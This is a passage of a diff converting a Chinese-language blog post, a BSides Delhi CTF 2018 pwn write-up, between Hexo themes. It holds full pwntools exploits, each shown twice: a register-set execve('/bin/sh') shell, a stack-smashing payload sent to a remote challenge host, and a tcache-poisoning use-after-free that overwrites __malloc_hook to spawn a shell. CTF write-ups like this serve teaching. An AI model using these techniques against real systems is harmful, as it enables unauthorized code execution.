class="line">    p.sendlineafter(<span class="string">'R8: '</span>, r8)</span><br><span class="line">    p.sendlineafter(<span class="string">'R9: '</span>, r9)</span><br><span class="line"></span><br><span class="line">register(str(<span class="number">0x3b</span>),str(<span class="number">0x6010A0</span> + <span class="number">0x30</span>),str(<span class="number">0x0</span>),str(<span class="number">0x0</span>),str(<span class="number">0</span>),str(<span class="number">0</span>),str(u64(<span class="string">'/bin/sh\x00'</span>)))</span><br><span class="line">sleep(<span class="number">30</span>) <span class="comment">#这里sleep(30)的原因是为了等程序执行 alarm(0x1e)，产生SIGALRM信号</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 1
+if local:
+    p = process(&#39;./easypeasy&#39;)
+    elf = ELF(&#39;./easypeasy&#39;)
+else:
+    p = remote(&quot;35.200.228.122&quot;,1337)
+    elf = ELF(&#39;./easypeasy&#39;)
+
+context.arch = elf.arch
+context.log_level=&#39;debug&#39;
+
+def register(rax,rdi,rsi,rdx,rcx,r8,r9):
+    p.sendlineafter(&#39;RAX: &#39;, rax)
+    p.sendlineafter(&#39;RDI: &#39;, rdi)
+    p.sendlineafter(&#39;RSI: &#39;, rsi)
+    p.sendlineafter(&#39;RDX: &#39;, rdx)
+    p.sendlineafter(&#39;RCX: &#39;, rcx)
+    p.sendlineafter(&#39;R8: &#39;, r8)
+    p.sendlineafter(&#39;R9: &#39;, r9)
+
+register(str(0x3b),str(0x6010A0 + 0x30),str(0x0),str(0x0),str(0),str(0),str(u64(&#39;/bin/sh\x00&#39;)))
+sleep(30) #这里sleep(30)的原因是为了等程序执行 alarm(0x1e)，产生SIGALRM信号
+p.interactive()
+</code></pre>
 <h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>smash the stack，利用__stack_chk_failed函数，打印出flag</p>
 <p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./canary')</span></span><br><span class="line">p = remote(<span class="string">"35.200.232.80"</span>,<span class="string">"1337"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">flag = <span class="number">0x06010A0</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x178</span> + p64(flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+
+#p = process(&#39;./canary&#39;)
+p = remote(&quot;35.200.232.80&quot;,&quot;1337&quot;)
+context.log_level=&quot;debug&quot;
+flag = 0x06010A0
+
+p.recv()
+payload = &#39;a&#39;*0x178 + p64(flag)
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
 <h3 id="data-bank"><a href="#data-bank" class="headerlink" title="data_bank"></a>data_bank</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  data_bank  checksec data_bank </span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/ BSides/data_bank/data_bank&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<p>这道题是一道堆的UAF的利用，但是libc版本是2.26，有tcache机制…….做的时候没有发现，虽然他给了libc文件，但是没有去检查libc的版本，下次一定记得去检查libc版本。而且不知道为什么我Ubuntu16.04不能运行他给的libc文件，所以我用的环境是Ubuntu18.04    </p>
+<pre><code>☁  data_bank  checksec data_bank 
+[*] &#39;/home/zs0zrc/pwn/ BSides/data_bank/data_bank&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>这道题是一道堆的UAF的利用，但是libc版本是2.26，有tcache机制…….做的时候没有发现，虽然他给了libc文件，但是没有去检查libc的版本，下次一定记得去检查libc版本。而且不知道为什么我Ubuntu16.04不能运行他给的libc文件，所以我用的环境是Ubuntu18.04    </p>
 <p>程序一共有5个功能</p>
 <ol>
 <li>add    新建一个chunk</li>
@@ -511,559 +358,366 @@
 <li>exit    退出</li>
 </ol>
 <p>漏洞点</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the index:"</span>);</span><br><span class="line">  result = get_int();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !table[v2] )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"The index is empty"</span>);</span><br><span class="line">    v1 = count--;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(table[v2]);<span class="comment">//存在UAF漏洞</span></span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"done"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"Sorry no more removal\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int delete()
+{
+  int result; // eax
+  int v1; // eax
+  signed int v2; // [rsp+Ch] [rbp-4h]
+
+  puts(&quot;Enter the index:&quot;);
+  result = get_int();
+  v2 = result;
+  while ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 6 )
+  {
+    if ( !table[v2] )
+      return puts(&quot;The index is empty&quot;);
+    v1 = count--;
+    if ( v1 )
+    {
+      free(table[v2]);//存在UAF漏洞
+      return puts(&quot;done&quot;);
+    }
+    result = puts(&quot;Sorry no more removal\n&quot;);
+  }
+  return result;
+}
+</code></pre>
 <p>利用思路：</p>
 <p>先利用view功能泄露出libc地址，然后通过UAF 加上tcache_posion分配到包含_malloc_hook的chunk，修改 __malloc_hook为one_gadget，最后再malloc一个chunk触发 malloc_hook来getshell。这里要注意的是因为有tcache机制，所以要先将tcache填满，才可以泄露出地址。</p>
 <p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./data_bank"</span>, env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./data_bank'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the index:\n"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the size:\n"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter data:\n"</span>,data)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the index:\n"</span>,str(idx))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the index:\n"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Please update the data:\n"</span>,data)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the index:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'b'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># 填满tcache</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x3ebca0</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line">__malloc_hook_add = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line">log.info(<span class="string">"libc_address &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(__malloc_hook_add<span class="number">-0x13</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">"b"</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"get shell"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the index:\n'</span>, <span class="string">'5'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Enter the size:\n'</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+context.log_level = &quot;debug&quot;
 
-      
-    </div>
+p = process(&quot;./data_bank&quot;, env = {&#39;LD_PRELOAD&#39;: &#39;./libc.so.6&#39;})
+elf = ELF(&#39;./data_bank&#39;)
+libc = ELF(&#39;./libc.so.6&#39;)
 
-    
+def add(idx,size,data):
+    p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)
+    p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx))
+    p.sendlineafter(&quot;Enter the size:\n&quot;,str(size))
+    p.sendlineafter(&quot;Enter data:\n&quot;,data)
 
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
+def delete(idx):
+    p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;3&quot;)
+    p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx))
 
 
+def edit(idx,data):
+    p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)
+    p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx))
+    p.sendlineafter(&quot;Please update the data:\n&quot;,data)
 
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/10/27/2018-10-27-BSides-Delhi-CTF-2018-writeup/" title="BSides Delhi CTF 2018 writeup">http://yoursite.com/2018/10/27/2018-10-27-BSides-Delhi-CTF-2018-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/10/23/2018-10-23-HitconCTF-复现/" rel="next" title="HitconCTF 复现">
-                <i class="fa fa-chevron-left"></i> HitconCTF 复现
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/30/2018-10-30-tcache下的堆利用的学习/" rel="prev" title="tcache下的堆利用的学习">
-                tcache下的堆利用的学习 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
+def show(idx):
+    p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;4&quot;)
+    p.sendlineafter(&quot;Enter the index:\n&quot;,str(idx))
 
 
 
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
+add(0,0x80,&#39;a&#39;*0x80)
+add(1,0x80,&#39;b&#39;*0x80)
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
+for i in range(7): # 填满tcache
+    delete(1)
 
-      
+delete(0)
+show(0)
+p.recvuntil(&quot;:&quot;)
+leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc_base = leak - 0x3ebca0
+libc.address = libc_base
+__malloc_hook_add = libc.symbols[&#39;__malloc_hook&#39;]
+one_gadget = libc_base + 0x10a38c
+log.info(&quot;libc_address {}&quot;.format(hex(libc_base)))
 
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
+add(2,0x60,&#39;a&#39;*0x60)
+delete(2)
+edit(2,p64(__malloc_hook_add-0x13))
+add(3,0x60,&quot;b&quot;*0x60)
+add(4,0x60,&#39;a&#39;*0x13 + p64(one_gadget))
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
+log.info(&quot;get shell&quot;)
+p.sendlineafter(&#39;&gt;&gt; &#39;, &#39;1&#39;)
+p.sendlineafter(&#39;Enter the index:\n&#39;, &#39;5&#39;)
+p.sendlineafter(&#39;Enter the size:\n&#39;, &#39;0&#39;)
 
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+p.interactive()
+</code></pre>
+
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-s-writeup/">CTF&#39;s writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#easypeasy"><span class="nav-number">1.</span> <span class="nav-text">easypeasy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#canary"><span class="nav-number">2.</span> <span class="nav-text">canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-bank"><span class="nav-number">3.</span> <span class="nav-text">data_bank</span></a></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
